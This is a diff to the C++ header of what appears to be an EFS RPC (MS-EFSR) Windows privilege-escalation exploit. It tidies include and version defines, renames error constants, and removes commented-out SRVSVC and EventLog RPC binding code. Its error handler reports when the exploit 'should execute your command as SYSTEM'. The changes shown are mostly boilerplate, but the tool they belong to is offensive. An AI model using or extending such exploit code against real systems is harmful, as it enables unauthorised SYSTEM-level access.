@@ -1,5 +1,7 @@
 #pragma once
 
+#define _WIN32_WINNT 0x0603
+
 #include <iostream>
 #include <Windows.h>
 #include <sddl.h>
@@ -9,11 +11,8 @@
 #include <string>
 #include <locale>
 #include <functional>
-#include <rpc.h> 
+#include <rpc.h>
 #include <strsafe.h>
-#include <winsdkver.h>
-#define _WIN32_WINNT 0x0601
-#include <sdkddkver.h>
 #include <random>
 
 #include "lib/ms-efsr_h.h"
@@ -51,13 +50,13 @@ wchar_t* generateRandomString() {
 void handleError(const wchar_t* function, long result) {
     wprintf(L"[error] %ls returned (%d): %ls\r\n", function, result, lookup_error_with_nameW(result));
 
-    if ((result == WIN32ERR_ERROR_BAD_NETPATH) or (result == WIN32ERR_ERROR_SUCCESS)) {
+    if ((result == ERROR_BAD_NETPATH) or (result == ERROR_SUCCESS)) {
         wprintf(L"|--> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
     }
-    else if (result == WIN32ERR_ERROR_ACCESS_DENIED) {
+    else if (result == ERROR_ACCESS_DENIED) {
         wprintf(L"|--> [-] Access Denied requiring more privileges, trying another one ...\r\n");
     }
-    else if (result == WIN32ERR_ERROR_NOT_SUPPORTED) {
+    else if (result == ERROR_NOT_SUPPORTED) {
         wprintf(L"|--> [-] RPC function probably not implemented on this system, trying another one ...\r\n");
     }
     else {
@@ -604,126 +603,3 @@ void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle
 
     return;
 }
-/*
-handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
-{
-    handle_t hBinding = NULL;
-    RPC_WSTR pszStringBinding;
-    long status;
-
-    wprintf(L"SRVSVC_HANDLE_bind() called\n");
-
-    status = RpcStringBindingComposeW(NULL,(RPC_WSTR) L"ncacn_np", (RPC_WSTR)pszSystemName, (RPC_WSTR) L"\\pipe\\srvsvc", NULL, &pszStringBinding);
-
-
-    if (status)
-    {
-        wprintf(L"RpcStringBindingCompose returned %ld\n", status);
-        return NULL;
-    }
-    status = RpcBindingFromStringBindingW(pszStringBinding,
-        &hBinding);
-    if (status)
-    {
-        wprintf(L"RpcBindingFromStringBinding returned %ld\n", status);
-    }
-
-    status = RpcStringFreeW(&pszStringBinding);
-    if (status)
-    {
-        //        TRACE("RpcStringFree returned 0x%x\n", status);
-    }
-
-    return hBinding;
-}
-
-
-void __RPC_USER
-SRVSVC_HANDLE_unbind(SRVSVC_HANDLE pszSystemName,
-    handle_t hBinding)
-{
-    RPC_STATUS status;
-
-    wprintf(L"SRVSVC_HANDLE_unbind() called\n");
-
-    status = RpcBindingFree(&hBinding);
-    if (status)
-    {
-        wprintf(L"RpcBindingFree returned 0x%x\n", status);
-    }
-}
-
-
-handle_t __RPC_USER
-EVENTLOG_HANDLE_A_bind(EVENTLOG_HANDLE_A UNCServerName)
-{
-    handle_t hBinding = NULL;
-    RPC_CSTR pszStringBinding;
-    RPC_STATUS status;
-
-
-    status = RpcStringBindingComposeA(NULL,
-        (RPC_CSTR)"ncacn_np",
-        (RPC_CSTR)UNCServerName,
-        (RPC_CSTR)"\\pipe\\EventLog",
-        NULL,
-        &pszStringBinding);
-    if (status)
-    {
-        return NULL;
-    }
-
-    status = RpcBindingFromStringBindingA(pszStringBinding,
-        &hBinding);
-
-    status = RpcStringFreeA(&pszStringBinding);
-
-    return hBinding;
-}
-
-
-void __RPC_USER
-EVENTLOG_HANDLE_A_unbind(EVENTLOG_HANDLE_A UNCServerName,
-    handle_t hBinding)
-{
-    RPC_STATUS status;
-
-    status = RpcBindingFree(&hBinding);
-}
-
-
-handle_t __RPC_USER
-EVENTLOG_HANDLE_W_bind(EVENTLOG_HANDLE_W UNCServerName)
-{
-    handle_t hBinding = NULL;
-    RPC_WSTR pszStringBinding;
-    RPC_STATUS status;
-
-    status = RpcStringBindingComposeW(NULL,
-        (RPC_WSTR) L"ncacn_np",
-        (RPC_WSTR) UNCServerName,
-        (RPC_WSTR) L"\\pipe\\EventLog",
-        NULL,
-        &pszStringBinding);
-    if (status != RPC_S_OK)
-    {
-        return NULL;
-    }
-
-    status = RpcBindingFromStringBindingW(pszStringBinding,
-        &hBinding);
-
-    status = RpcStringFreeW(&pszStringBinding);
-
-    return hBinding;
-}
-
-
-void __RPC_USER
-EVENTLOG_HANDLE_W_unbind(EVENTLOG_HANDLE_W UNCServerName,
-    handle_t hBinding)
-{
-    RPC_STATUS status;
-
-    status = RpcBindingFree(&hBinding);
-}*/
